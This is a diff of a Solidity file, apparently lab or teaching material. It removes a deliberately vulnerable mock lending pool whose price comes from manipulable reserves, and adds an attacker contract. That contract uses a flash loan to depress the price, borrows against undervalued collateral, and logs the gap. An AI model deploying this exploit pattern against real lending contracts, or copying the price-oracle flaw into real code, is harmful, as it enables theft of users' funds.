@@ -5,32 +5,43 @@ interface IFlashLoanReceiver {
     function executeOperation(uint256 amount, uint256 fee, bytes calldata data) external;
 }
 
-contract MockLendingPoolVulnerable {
-    uint256 public reserveToken = 10000;
-    mapping(address => uint256) public tokenBalances;
+interface ILendingPool {
+    function flashLoan(uint256 amount, bytes calldata data) external;
+    function borrowAgainstCollateral(uint256 borrowAmount) external payable;
+    function getPrice() external view returns (uint256);
+}
 
-    // VULNERABILITY: Spot price calculated directly from internal reserves (manipulable)
-    function getPrice() public view returns (uint256) {
-        return reserveToken;
+contract LendingPoolAttacker is IFlashLoanReceiver {
+    ILendingPool public pool;
+    address public owner;
+
+    // NEW LINE: declares the shape of the log entry
+    event ExploitExecuted(uint256 borrowAmount, uint256 manipulatedPrice, uint256 collateralPaid, uint256 fairCollateral);
+
+    constructor(address _poolAddress) {
+        pool = ILendingPool(_poolAddress);
+        owner = msg.sender;
     }
 
-    function flashLoan(uint256 amount, bytes calldata data) external {
-        uint256 fee = 10;
-        tokenBalances[msg.sender] += amount;
-        reserveToken -= amount;
-
-        IFlashLoanReceiver(msg.sender).executeOperation(amount, fee, data);
-
-        require(tokenBalances[msg.sender] >= amount + fee, "Flash loan not repaid");
-        tokenBalances[msg.sender] -= (amount + fee);
-        reserveToken += (amount + fee);
+    function attack(uint256 loanAmount) external payable {
+        pool.flashLoan(loanAmount, "");
     }
 
-    function borrowAgainstCollateral(uint256 borrowAmount) external payable {
-        // Collateral required is determined by the manipulable getPrice()
-        uint256 requiredCollateral = (borrowAmount * getPrice()) / 100;
-        require(msg.value >= requiredCollateral, "Insufficient collateral");
-        tokenBalances[msg.sender] += borrowAmount;
-        reserveToken -= borrowAmount;
+    function executeOperation(
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external override {
+        uint256 price = pool.getPrice();
+
+        uint256 borrowAmount = 50;
+        uint256 requiredCollateral = (borrowAmount * price) / 100;
+        pool.borrowAgainstCollateral{value: requiredCollateral}(borrowAmount);
+
+        // NEW LINE: actually record the log entry, with real numbers
+        uint256 fairCollateral = (borrowAmount * 10000) / 100;
+        emit ExploitExecuted(borrowAmount, price, requiredCollateral, fairCollateral);
     }
+
+    receive() external payable {}
 }
